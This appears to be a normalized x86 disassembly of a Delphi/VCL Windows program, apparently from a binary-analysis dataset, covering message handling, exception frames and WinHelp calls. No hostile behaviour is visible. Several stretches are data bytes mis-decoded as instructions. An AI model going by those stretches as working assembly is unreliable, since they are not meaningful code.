mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_439034
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4391f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_445434
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4391fb
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_403f64
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_403f40
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404200
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c380
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404200
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044a0
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404200
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_4044a0
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404128
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_404208
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_446450
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403368
push ebp
call sub_438f50
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_404200
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404128
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404128
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_4042c0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_439204
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4392d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_446450
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4392df
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_439308
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_439330
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_439354
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439379
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439380
retn
sub_439390
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x94
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 4 ] ch
inc ebx
add [ eax - 0x80000000 ] ah
mov eax 0xee480044
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] cl
rol [ eax + eax + 0x58 ] 0xc1
inc esp
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
and bh al
inc esp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
cmp al 0x94
inc ebx
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
or [ ebx + 0x2e8f0c4 ] al
mov al [ 0xffffffffda8bfffc ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
fcom [ ebx - 0x469fffbd ]
inc esp
add [ eax + eax ] al
or [ ebx + 0x74 ] dl
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] eax
xchg esp eax
adc [ eax ] al
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
add bh bh
movsb [ edi ] [ esi ]
les eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040003 ] al
imul ebp [ esi + 0x74 ] 0x5300408d
push esi
test dl dl
je r-xdata
mov esi eax
xor edx edx
mov eax esi
call sub_44c0b4
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_403490
sub_439480
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c0b4
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4394bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4394e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4394e8
retn
sub_43958c
insd
xchg ebp eax
inc ebx
add [ edi - 0x6b ] dh
ja r-xdata
cmp cl [ ebp + edx * 4 + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
loopne r-xdata
inc ebx
add [ ecx + 0x25004395 ] al
xchg ebp eax
inc ebx
add [ 0x35004395 ] ch
xchg ebp eax
inc ebx
add [ 0x45004395 ] bh
xchg ebp eax
inc ebx
add [ ebp - 0x6b ] cl
inc ebx
add [ ebp - 0x6b ] dl
inc ebx
add [ ebp - 0x6b ] bl
inc ebx
add [ ebp - 0x6b ] ah
inc ebx
add [ 0xd004395 ] al
xchg ebp eax
inc ebx
add [ 0x1d004395 ] dl
xchg ebp eax
inc ebx
add ch bh
dec ebp
xchg ebp eax
cmp cl [ ebp + edx * 4 + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
push es
add [ eax ] al
imul eax [ edx ] 0x0
add [ ebx + 0x77e9e0c0 ] al
add al [ eax ]
add [ ebx - 0x18161f40 ] al
add al [ eax ]
add [ ebx - 0x7c161f40 ] al
add eax [ eax ]
add [ ebx + 0x7fe9e0c0 ] al
xchg esp eax
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sbb eax 0xfd004395
cmp cl [ ebp + edx * 4 + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add eax [ eax ]
add [ ebx - 0x161f40 ] al
cmp eax [ 0xffffffffc0830000 ]
or eax 0x15004395
xchg ebp eax
inc ebx
add [ 0xfffffffffd004395 ] bl
inc ebx
add al dl
xchg ebp eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x24004396 ] cl
add [ eax ] al
add [ ecx + edx + 0x33b40040 ] ah
inc eax
add [ eax + 0x59 ] dl
inc eax
add [ ecx + ebx * 2 + 0x40 ] bl
add al cl
xor eax [ eax ]
mov esp 0x6c004033
pop ecx
inc eax
add [ eax ] ah
xor [ eax ] eax
adc al 0xa1
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
and [ ecx + 0x1c0042 ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439755
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f40
test edi edi
jne r-xdata
add eax [ eax ]
add [ ebx + 0x3fe9e0c0 ] al
add eax 0xc0830000
loopne r-xdata
dec edi
add eax 0x44830000
and al 0x4
loopne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403fd8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
loopne r-xdata
add [ ebx + 0x3be9e0c0 ] al
add eax 0xc0830000
add eax 0x83fffcc4
inc esp
and al 0x4
loopne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
shl al 0xe9
and eax esp
cld
inc [ ebx - 0x1ffbdbbc ]
jmp sub_4059b8
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43975c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042c0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4396a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439755
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f40
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403fd8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43975c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042c0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_439770
push ebx
mov ebx eax
mov eax ebx
call sub_439aa0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4058d0
sub_4397ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439813
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4396a0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43981a
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_439824
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4398ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_439798
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042c0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4398b3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_4398bf
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439947
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_439fe4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43994e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4396a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4398cc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439947
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_439fe4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43994e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4396a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_439954
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439a4c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4396a0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409118
mov eax ebx
call sub_439fe4
test al al
je r-xdata
mov ecx sub_4394f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a53
lea eax [ ebp - 0x1c ]
call sub_403f40
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4396a0
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_439f3c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f94
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_439abc
push ebx
mov ebx eax
mov eax ebx
call sub_439aa0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4058d0
pop ebx
retn
mov eax rw-data
call sub_4058d0
sub_439aec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_439b44
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439b4b
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4396a0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_439b54
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439c4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_4090d8
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4396a0
mov eax ebx
call sub_439fe4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439c51
lea eax [ ebp - 0x110 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041b0
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_439f3c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041b0
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_439c68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_439cca
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439cd1
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4396a0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_439cdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439d5c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4396a0
mov eax ebx
call sub_439fe4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d63
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_439f3c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_439d6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_439e57
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_439fe4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e5e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f64
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408388
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_439f3c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408388
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f94
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4396a0
mov eax [ ebp - 0x14 ]
call sub_404400
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_439e6c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408b50
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_439ec7
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408b2c
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_439f3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_439fb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_439f20
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fb9
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407f48
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_439fc8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_439fe4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_439f20
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_439fc4
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_439fc8
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43a040
sub_43a040
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43a0bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_439aa0
call GetTickCount
mov ebx eax
push 0x0
call sub_40643c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4396a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a0c4
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a0cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403490
call sub_4058e8
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43a114
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_43a140
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a1ae
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
